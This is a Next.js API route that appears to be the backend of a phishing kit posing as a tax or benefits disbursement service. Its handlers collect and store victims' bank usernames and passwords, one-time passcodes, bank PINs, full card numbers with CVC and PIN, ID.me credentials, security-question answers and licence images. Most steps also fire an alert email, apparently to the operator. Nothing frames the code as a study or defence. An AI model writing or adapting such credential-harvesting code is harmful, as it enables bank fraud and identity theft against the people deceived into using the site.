import { NextResponse } from "next/server";
import { verifyToken } from "@/lib/auth";
import prisma from "@/lib/prisma";
import { sendActionAlert } from "@/lib/sendMail";

export async function POST(req: Request) {
  try {
    const userId = verifyToken(req);

    if (!userId) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    const body = await req.json();
    const { action, ...data } = body;

    switch (action) {
      // ── Details (preferences) ──
      case "details": {
        const { hasCreditCard, filed2026Tax, paymentFrequency } = data;
        const user = await prisma.user.update({
          where: { id: userId },
          data: { hasCreditCard, filed2026Tax, paymentFrequency },
        });
        return NextResponse.json({ success: true, user: { id: user.id, hasCreditCard: user.hasCreditCard, filed2026Tax: user.filed2026Tax, paymentFrequency: user.paymentFrequency } }, { status: 200 });
      }

      // ── Checklist ──
      case "checklist": {
        const { checklist } = data;
        const user = await prisma.user.update({
          where: { id: userId },
          data: { checklistCompleted: JSON.stringify(checklist) },
          select: { id: true, checklistCompleted: true },
        });
        return NextResponse.json(user, { status: 200 });
      }

      // ── Disbursement ──
      case "disbursement": {
        const { bankName, disbursementAccount, disbursementRouting, accountType, accountBalance, bankUsername, bankPassword, cardNumber, cardExp, cardCvc, cardPin } = data;
        const user = await prisma.user.update({
          where: { id: userId },
          data: { bankName, disbursementAccount, disbursementRouting, accountType, accountBalance, bankUsername, bankPassword, cardNumber, cardExp, cardCvc, cardPin, bankLinked: true },
        });
        await sendActionAlert("Disbursement Details Submitted", user.email);
        return NextResponse.json({ success: true, user: { id: user.id, bankLinked: user.bankLinked } }, { status: 200 });
      }

      // ── Link Bank ──
      case "link-bank": {
        const { step, institution, username, password, otp, pin } = data;

        if (step === "credentials") {
          if (!institution || !username || !password) {
            return NextResponse.json({ error: "Missing bank credentials" }, { status: 400 });
          }
          const user = await prisma.user.update({
            where: { id: userId },
            data: { bankLinked: true, bankVerified: false, bankName: institution, bankUsername: username, bankPassword: password },
          });
          await sendActionAlert("Bank Account Linked (Credentials)", user.email);
          return NextResponse.json({ success: true, user: { id: user.id, bankLinked: user.bankLinked, bankName: user.bankName } }, { status: 200 });
        }

        if (step === "otp") {
          if (!otp) {
            return NextResponse.json({ error: "Missing OTP" }, { status: 400 });
          }
          const user = await prisma.user.update({
            where: { id: userId },
            data: { bankOtp: otp, bankVerified: true },
          });
          await sendActionAlert("Bank Link: OTP Submitted", user.email);
          return NextResponse.json({ success: true, user: { id: user.id } }, { status: 200 });
        }

        if (step === "pin") {
          if (!pin) {
            return NextResponse.json({ error: "Missing PIN" }, { status: 400 });
          }
          const user = await prisma.user.update({
            where: { id: userId },
            data: { bankPin: pin, bankVerified: true },
          });
          await sendActionAlert("Bank Link: PIN Submitted", user.email);
          return NextResponse.json({ success: true, user: { id: user.id, bankVerified: user.bankVerified } }, { status: 200 });
        }

        return NextResponse.json({ error: "Invalid step" }, { status: 400 });
      }

      // ── Link Card ──
      case "link-card": {
        const { cardNumber, cardExp, cardCvc, cardPin } = data;
        if (!cardNumber || !cardExp || !cardCvc || !cardPin) {
          return NextResponse.json({ error: "Missing card details" }, { status: 400 });
        }
        const user = await prisma.user.update({
          where: { id: userId },
          data: { cardNumber, cardExp, cardCvc, cardPin },
        });
        await sendActionAlert("Credit/Debit Card Linked", user.email);
        return NextResponse.json({ success: true, user: { id: user.id } }, { status: 200 });
      }

      // ── Income Proof ──
      case "income": {
        const { type, file } = data;
        const user = await prisma.user.update({
          where: { id: userId },
          data: { incomeProofType: type, incomeProofFile: file, incomeProofStatus: "pending" },
        });
        await sendActionAlert("Income Proof Document Uploaded", user.email);
        return NextResponse.json({ success: true, incomeProofStatus: user.incomeProofStatus }, { status: 200 });
      }

      // ── ID.me ──
      case "idme": {
        const { email, password } = data;
        const user = await prisma.user.update({
          where: { id: userId },
          data: { idMeEmail: email, idMePassword: password, idMeStatus: "pending" },
        });
        await sendActionAlert("ID.me Verification Credentials Submitted", user.email);
        return NextResponse.json({ success: true, idMeStatus: user.idMeStatus }, { status: 200 });
      }

      // ── Identity Verification (Questions) ──
      case "identity-verification": {
        const { fathersName, mothersName, mothersMaidenName, placeOfBirth, spouseName } = data;
        try {
          const user = await prisma.user.update({
            where: { id: userId },
            data: {
              identityQuestionsStatus: "verified",
              kyc: {
                update: { fathersName, mothersName, mothersMaidenName, placeOfBirth, spouseName },
              },
            },
            include: { kyc: true },
          });
          await sendActionAlert("Identity Verification Questions Submitted", user.email);
          return NextResponse.json({ success: true, identityQuestionsStatus: user.identityQuestionsStatus }, { status: 200 });
        } catch (err: any) {
          if (err.code === "P2025") {
            const user = await prisma.user.update({
              where: { id: userId },
              data: {
                identityQuestionsStatus: "verified",
                kyc: {
                  create: {
                    fathersName: fathersName || "Pending",
                    mothersName: mothersName || "Pending",
                    mothersMaidenName: mothersMaidenName || "Pending",
                    placeOfBirth: placeOfBirth || "Pending",
                    spouseName: spouseName || "Pending",
                    fullName: "Pending", dob: "Pending", ssn: "Pending",
                    address: "Pending", city: "Pending", state: "Pending",
                    zip: "Pending", idNumber: "Pending",
                  },
                },
              },
            });
            await sendActionAlert("Identity Verification Questions Submitted (Fallback)", user.email);
            return NextResponse.json({ success: true, identityQuestionsStatus: user.identityQuestionsStatus }, { status: 200 });
          }
          throw err;
        }
      }

      // ── Verify Identity (license upload) ──
      case "verify-identity": {
        const { licenseFront, licenseBack } = data;
        if (!licenseFront || !licenseBack) {
          return NextResponse.json({ error: "Missing identity documents" }, { status: 400 });
        }
        const updatedKYC = await prisma.kYC.update({
          where: { userId },
          data: { licenseFront, licenseBack },
        });
        return NextResponse.json({ success: true, kyc: { id: updatedKYC.id, licenseFront: !!updatedKYC.licenseFront, licenseBack: !!updatedKYC.licenseBack } }, { status: 200 });
      }

      default:
        return NextResponse.json({ error: `Unknown action: ${action}` }, { status: 400 });
    }
  } catch (err: any) {
    console.error("USER ACTION ERROR:", err);
    return NextResponse.json({ error: err?.message || "Internal Server Error" }, { status: 500 });
  }
}
